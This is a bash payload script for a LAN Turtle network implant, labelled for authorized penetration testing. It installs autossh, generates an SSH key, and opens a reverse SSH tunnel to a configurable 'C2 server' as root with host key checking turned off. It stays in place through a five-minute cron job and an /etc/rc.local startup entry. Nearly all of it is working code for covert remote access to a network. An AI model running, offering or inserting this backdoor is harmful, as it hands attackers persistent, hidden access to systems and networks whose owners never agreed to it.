#!/bin/bash
# Title: Persistent SSH Access
# Author: David Osisek (CamoZeroDay)
# Target: LAN Turtle
# Version: 1.0
# Category: Persistence
# 
# ⚠️ FOR AUTHORIZED PENETRATION TESTING ONLY
# Maintains persistent reverse SSH tunnel

# CONFIGURATION
ATTACKER_IP="10.0.0.1"  # Change to your C2 server IP
ATTACKER_PORT="2222"     # SSH port on your server
LOCAL_PORT="22"          # LAN Turtle SSH port
CHECK_INTERVAL="60"      # Health check interval (seconds)

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

echo -e "${GREEN}[+] LAN Turtle - Persistent SSH Access${NC}"
echo -e "${YELLOW}[*] Target: ${ATTACKER_IP}:${ATTACKER_PORT}${NC}"
echo -e "${YELLOW}[*] FOR AUTHORIZED TESTING ONLY${NC}"

# Install autossh if not present
if ! command -v autossh &> /dev/null; then
    echo -e "${YELLOW}[*] Installing autossh...${NC}"
    opkg update
    opkg install autossh
fi

# Generate SSH key if doesn't exist
if [ ! -f ~/.ssh/id_rsa ]; then
    echo -e "${YELLOW}[*] Generating SSH key...${NC}"
    mkdir -p ~/.ssh
    ssh-keygen -t rsa -b 4096 -f ~/.ssh/id_rsa -N ""
    echo -e "${GREEN}[+] SSH key generated${NC}"
    echo -e "${YELLOW}[!] Copy this public key to attacker server:${NC}"
    cat ~/.ssh/id_rsa.pub
    echo ""
fi

# Start reverse SSH tunnel
echo -e "${GREEN}[+] Starting reverse SSH tunnel...${NC}"
autossh -M 0 -f -N \
    -o "ServerAliveInterval=${CHECK_INTERVAL}" \
    -o "ServerAliveCountMax=3" \
    -o "StrictHostKeyChecking=no" \
    -o "UserKnownHostsFile=/dev/null" \
    -R ${ATTACKER_PORT}:localhost:${LOCAL_PORT} \
    root@${ATTACKER_IP}

if [ $? -eq 0 ]; then
    echo -e "${GREEN}[+] Reverse tunnel established${NC}"
    echo -e "${GREEN}[+] Connect from attacker: ssh -p ${ATTACKER_PORT} root@localhost${NC}"
else
    echo -e "${RED}[-] Failed to establish tunnel${NC}"
    exit 1
fi

# Make persistent via cron
echo -e "${YELLOW}[*] Setting up persistence...${NC}"

CRON_CMD="*/5 * * * * /root/modules/persistent-access.sh > /dev/null 2>&1"

# Check if cron job already exists
if ! crontab -l 2>/dev/null | grep -q "persistent-access.sh"; then
    (crontab -l 2>/dev/null; echo "${CRON_CMD}") | crontab -
    echo -e "${GREEN}[+] Cron job added for persistence${NC}"
else
    echo -e "${YELLOW}[*] Cron job already exists${NC}"
fi

# Add to startup
if ! grep -q "persistent-access.sh" /etc/rc.local 2>/dev/null; then
    echo "/root/modules/persistent-access.sh &" >> /etc/rc.local
    echo -e "${GREEN}[+] Added to startup${NC}"
fi

echo -e "${GREEN}[+] Persistent access configured${NC}"
echo -e "${YELLOW}[*] Tunnel will auto-reconnect if dropped${NC}"
